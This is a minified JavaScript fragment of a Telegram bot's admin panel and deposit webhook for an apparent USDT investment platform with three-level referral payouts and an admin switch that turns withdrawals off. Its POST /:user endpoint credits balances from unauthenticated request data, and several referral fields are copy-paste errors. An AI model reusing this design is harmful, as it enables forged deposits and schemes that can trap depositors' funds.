                     V.on("text", (async e => {
            try {
                if ("⬅️ Back" == e.message.text) we(e);
                else {
                    const t = parseInt(e.message.text);
                    let a = await ne.collection("info").findOne({
                        user: t
                    });
                    if (a) {
                        let n = `🐥 *User:* [${t}](tg://user?id=${t})\n\n`;
                        n += `💰 *Balance:* ${a.balance} USDT\n`, n += `💼 *Wallet:* ${a.wallet}\n`, n += `🔑 *Deposit Address:* ${a.depositAddress}\n`, n += `💳 *Deposit balance:* ${a.depositBalance} USDT\n`, n += `📊 *Active Investments:* ${a.activeMining}\n`, n += `🚀 *Total Profit:* ${a.totalProfit} USDT\n`, n += `💸 *Total Affiliate Bonus:* ${a.totalAffiliateBonus} USDT\n\n`, n += "User Referral details\n", n += `level 1 count *Users:* ${a.referlvl1user} \n`, n += `level 2 count *Users:* ${a.referlvl1user} \n`, n += `level 3 count *Users:* ${a.referlvl1user} \n\n`, n += "User Upliner details\n", n += `level 1 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl1user}) \n`, n += `level 2 *User:*[${a.referlvl1user}](tg://user?id=${a.referlvl2user}) \n`, n += `level 3 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl3user}) \n`, ue(e, n, {
                            reply_markup: {
                                keyboard: re,
                                resize_keyboard: !0
                            }
                        });
                        let r = await ne.collection("userdeposits").findOne({
                            user: t
                        });
                        if (r) {
                            const t = r.deposits.length,
                                a = Math.ceil(t / 10);
                            let n = t - 1;
                            for (let t = 0; t < a; t++) {
                                let a = `💰 * Deposit History:* (${n+1}-${Math.max(0,n-9)})\n\n`;
                                for (let e = 0; e < 10 && n >= 0; e++) {
                                    const s = r.deposits[n],
                                        i = s.date,
                                        o = s.txId;
                                    a += `*${e+1+10*t})* Amount: ${s.amount} USDT\nDate: ${i}\nTx ID: [${o}](${o})\nBlock Number: ${s.blockNumber}\n\n`, n--
                                }
                                ue(e, a, {
                                    disable_web_page_preview: !0
                                })
                            }
                        } else e.reply("🙁 have no deposit history yet!");
                        let s = await ne.collection("withdraw").find({
                            user: t
                        }).toArray();
                        if (0 === s.length) e.reply("🙁  have no withdrawal history yet!");
                        else {
                            const t = s.length,
                                a = Math.ceil(t / 10);
                            let n = t - 1;
                            for (let t = 0; t < a; t++) {
                                let a = `💸 * Withdrawal History:* (${n+1}-${Math.max(0,n-9)})\n\n`;
                                for (let e = 0; e < 10 && n >= 0; e++) {
                                    const r = s[n],
                                        i = r.date.toLocaleString("en-US", {
                                            timeZone: "UTC"
                                        }),
                                        o = "Pending" !== r.txId ? `[${r.txId}](${r.txId})` : "PendingTransaction";
                                    a += `*${e+1+10*t})* Amount: ${r.amount} USDT\nDate: ${i}\nTx ID: ${o}\nWallet: ${r.wallet}\nStatus: ${r.status}\n\n`, n--
                                }
                                e.replyWithMarkdown(a, {
                                    disable_web_page_preview: !0
                                })
                            }
                        }
                        let i = await ne.collection("userinvestmentinlist").findOne({
                            user: t
                        });
                        if (!i || !i.investments || 0 === i.investments.length) return void e.reply("🙁 have no investment or withdrawal history yet!");
                        const o = i.investments.length,
                            l = Math.ceil(o / 10);
                        let d = o - 1;
                        for (let t = 0; t < l; t++) {
                            let a = `💰 * Investment History:* (${d+1}-${Math.max(0,d-9)})\n\n`;
                            for (let e = 0; e < 10 && d >= 0; e++) {
                                const n = i.investments[d],
                                    r = new Date(n.starttime).toLocaleDateString(),
                                    s = new Date(n.endtime).toLocaleDateString();
                                let o = "";
                                if ("completed" !== n.status) {
                                    const e = n.endtime - Date.now();
                                    o = `${Math.floor(e/36e5)}h ${Math.floor(e%36e5/6e4)}m ${Math.floor(e%6e4/1e3)}s`
                                }
                                a += `*${e+1+10*t})* Amount: ${n.amount} USDT\nStart Date: ${r}\nEnd Date: ${s}`, "" !== o && (a += `\nRemaining Time: ${o}`), a += `\nStatus: ${n.status}\n\n`, d--
                            }
                            e.replyWithMarkdown(a, {
                                disable_web_page_preview: !0
                            })
                        }
                    } else ue(e, "*⛔User Not Found In Our Database*", {
                        reply_markup: {
                            keyboard: re,
                            resize_keyboard: !0
                        }
                    })
                }
                e.scene.leave(t)
            } catch (e) {
                te(e)
            }
        })), S.action("change_balance", (e => {
            try {
                e.deleteMessage(), ue(e, "*💡 Send User Telegram Id & Amount\n\n⚠️ Use Format : \n\n*`" + e.from.id + " 10 depositBalance` \n\n `" + e.from.id + " 10 balance`", {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                }), e.scene.enter("chabal")
            } catch (e) {
                te(e)
            }
        })), S.action("getref", (e => {
            try {
                e.deleteMessage(), ue(e, "💡 Send User Telegram Id \n\n", {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                }), e.scene.enter("refdetails")
            } catch (e) {
                te(e)
            }
        })), S.action("get_details", (e => {
            try {
                e.deleteMessage(), ue(e, "*💡 Send User Telegram Id *", {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                }), e.scene.enter("getdetails")
            } catch (e) {
                te(e)
            }
        })), S.action("bot_status", (async e => {
            try {
                let s = await ne.collection("admin").find({
                        admin: "admin"
                    }).toArray(),
                    i = await ne.collection("withdraw").find({
                        status: "pending"
                    }).toArray();
                if ("Active" == s[0].botstat) {
                    ne.collection("admin").updateOne({
                        admin: "admin"
                    }, {
                        $set: {
                            botstat: "Disable"
                        }
                    });
                    var t = "⛔️ Disable"
                } else t = "✅ Active", ne.collection("admin").updateOne({
                    admin: "admin"
                }, {
                    $set: {
                        botstat: "Active"
                    }
                });
                var a = s;
                if ( "On" == s[0].withstat) var n = "✅ On";
                else n = "⛔️ Off";
                a[0].mid, a[0].mkey, a[0].subid;
                var r = [
                    [{
                        text: "🛑Change Balance",
                        callback_data: "change_balance"
                    }, {
                        text: "🧾Get Details",
                        callback_data: "get_details"
                    }],
                    [{
                        text: "🟢Bot:" + t,
                        callback_data: "bot_status"
                    }, {
                        text: "🟢Withdraw:" + n,
                        callback_data: "with_status"
                    }],
                    [{
                        text: "Pending Withdrawls",
                        callback_data: "pendingwithdraw"
                    }],
                    [{
                        text: "get ref details",
                        callback_data: "getref"
                    }]
                ];
                ce(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + i.length + "\n🤖 Bot Status:" + t + "\n\t\t\t\t📤 Withdrawals:" + n + "*", {
                    reply_markup: {
                        inline_keyboard: r
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                te(e)
            }
        })), J.on("text", (async e => {
            try {
                if ("⬅️ Back" == e.message.text) we(e);
                else {
                    function t(e, t) {
                        const a = [];
                        for (let n = 0; n < e.length; n += t) {
                            const r = e.slice(n, n + t);
                            a.push(r)
                        }
                        return a
                    }
                    const a = parseInt(e.message.text),
                        n = await ne.collection("lvl1users").findOne({
                            user: a
                        });
                    let r = "Level 1 Details\n";
                    if (n && n.registeredUsers.length > 0) {
                        let d = n.registeredUsers.slice(0, 60);
                        for (const u of d) r += `\n- User ID: [${u.firstname}](tg://user?id=${u.userid}) his deposits: ${u.deposits}$ ,You earned: ${fe(u.earnings,4)} USDT`;
                        await e.replyWithMarkdown(r, {
                            parse_mode: "Markdown"
                        });
                        let c = t(n.registeredUsers.slice(60), 60);
                        for (const m of c) {
                            let f = "Level 1 Details (Continued)\n";
                            for (const p of m) f += `\n- User ID: [${p.firstname}](tg://user?id=${p.userid}) his deposits: ${p.deposits}$ ,You earned: ${fe(p.earnings,4)} USDT`;
                            await e.replyWithMarkdown(f, {
                                parse_mode: "Markdown"
                            })
                        }
                    } else r += "\nNo Referrals in lvl 1", await e.replyWithMarkdown(r, {
                        parse_mode: "Markdown"
                    });
                    const s = await ne.collection("lvl2users").findOne({
                        user: a
                    });
                    let i = "Level 2 Details\n";
                    if (s && s.registeredUsers.length > 0) {
                        let y = s.registeredUsers.slice(0, 60);
                        for (const v of y) i += `\n- User ID: [${v.firstname}](tg://user?id=${v.userid}) his deposits: ${v.deposits}$ ,You earned: ${fe(v.earnings,4)} USDT`;
                        await e.replyWithMarkdown(i, {
                            parse_mode: "Markdown"
                        });
                        let w = t(s.registeredUsers.slice(60), 60);
                        for (const h of w) {
                            let g = "Level 2 Details (Continued)\n";
                            for (const k of h) g += `\n- User ID: [${k.firstname}](tg://user?id=${k.userid}) his deposits: ${k.deposits}$ ,You earned: ${fe(k.earnings,4)} USDT`;
                            await e.replyWithMarkdown(g, {
                                parse_mode: "Markdown"
                            })
                        }
                    } else i += "\nNo Referrals in lvl 2", await e.replyWithMarkdown(i, {
                        parse_mode: "Markdown"
                    });
                    const o = await ne.collection("lvl3users").findOne({
                        user: a
                    });
                    let l = "Level 3 Details\n";
                    if (o && o.registeredUsers.length > 0) {
                        let b = o.registeredUsers.slice(0, 60);
                        for (const $ of b) l += `\n- User ID: [${$.firstname}](tg://user?id=${$.userid}) his deposits: ${$.deposits}$ ,You earned: ${fe($.earnings,4)} USDT`;
                        await e.replyWithMarkdown(l, {
                            parse_mode: "Markdown"
                        });
                        let _ = t(o.registeredUsers.slice(60), 60);
                        for (const D of _) {
                            let x = "Level 3 Details (Continued)\n";
                            for (const T of D) x += `\n- User ID: [${T.firstname}](tg://user?id=${T.userid}) his deposits: ${T.deposits}$ ,You earned: ${fe(T.earnings,4)} USDT`;
                            await e.replyWithMarkdown(x, {
                                parse_mode: "Markdown"
                            })
                        }
                    } else l += "\nNo Referrals in lvl 3", await e.replyWithMarkdown(l, {
                        parse_mode: "Markdown"
                    }), e.scene.leave("refdetails")
                }
            } catch (U) {
                te(U)
            }
        })), S.action("with_status", (async e => {
            try {
                let s = await ne.collection("withdraw").find({
                        status: "pending"
                    }).toArray(),
                    i = await ne.collection("admin").find({
                        admin: "admin"
                    }).toArray(),
                    o = i[0].botstat;
                if ("On" == i[0].withstat) {
                    ne.collection("admin").updateOne({
                        admin: "admin"
                    }, {
                        $set: {
                            withstat: "Off"
                        }
                    });
                    var t = "⛔️ Off"
                } else t = "✅ On", ne.collection("admin").updateOne({
                    admin: "admin"
                }, {
                    $set: {
                        withstat: "On"
                    }
                });
                var a = i;
                if ("Active" == o) var n = "✅ Active";
                else n = "⛔️ Disable";
                a[0].mid, a[0].mkey, a[0].subid;
                var r = [
                    [{
                        text: "🛑Change Balance",
                        callback_data: "change_balance"
                    }, {
                        text: "🧾Get Details",
                        callback_data: "get_details"
                    }],
                    [{
                        text: "🟢Bot:" + n,
                        callback_data: "bot_status"
                    }, {
                        text: "🟢Withdraw:" + t,
                        callback_data: "with_status"
                    }],
                    [{
                        text: "Pending Withdrawls",
                        callback_data: "pendingwithdraw"
                    }],
                    [{
                        text: "get ref details",
                        callback_data: "getref"
                    }]
                ];
                ce(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + s.length + "\n🤖 Bot Status:" + n + "\n\t\t\t\t📤 Withdrawals:" + t + "*", {
                    reply_markup: {
                        inline_keyboard: r
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                te(e)
            }
        })), ee.on("text", (async e => {
            let t = await ne.collection("info").find({}, {
                    projection: {
                        user: 1,
                        _id: 0
                    }
                }).toArray(),
                a = e.message.text;
            if ("⬅️ Back" == a) return we(e), void e.scene.leave("broad");
            for (var n of (ue(e, "*✅ Broadcast Sended To All Users*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), t)) de(n.user, "*🔈 Broadcast By Admin*\n\n" + a, {
                parse_mode: "Markdown",
                disable_web_page_preview: !0
            }).catch((e => console.log(e)));
            e.scene.leave("broad")
        })), S.command("broadcast", (async e => {
            w.includes(e.from.id) && (e.reply("*💡 Send Message To Send Broadcast*", {
                parse_mode: "markdown",
                reply_markup: {
                    keyboard: [
                        ["⬅️ Back"]
                    ],
                    resize_keyboard: !0
                }
            }), await e.scene.enter("broad"))
        })), M.post("/:user", (async (e, t) => {
            const {
                user: a
            } = e.params, n = e.body, r = parseFloat(a), s = n.txId, i = parseFloat(n.amount), o = n.blockNumber;
            if (i>=25){
            var l = await ne.collection("info").find({
                user: r
            }).toArray();
            
            await ne.collection("info").updateOne({
                user: r
            }, {
                $inc: {
                    depositBalance: i,
                    maxdepo: i * 4 //Add refer balance
                }
            }), await ne.collection("statistics").updateOne({}, {
                $inc: {
                    totalDeposits: i,
                }
            });
            const d = {
                    user: r
                },
                c = {
                    $push: {
                        deposits: {
                            txId: s,
                            amount: i,
                            blockNumber: o,
                            date: new Date
                        }
                    }
                };
                
            await ne.collection("userdeposits").updateOne(d, c, {
                upsert: !0
            }), de(a, `🎉 Woohoo! You just received a deposit of ${i} USDT`, {
                parse_mode: "Markdown",
                disable_web_page_preview: !0
            });
            
            t.sendStatus(200)
        } else {
            t.sendStatus(200)
        }
    }), M.get("/", ((e, t) => {
            t.send("API VERSION 1.03")
        }))), M.listen(process.env.PORT || 3000), console.log("Webhook server listening on port 8888")
    })()
})();
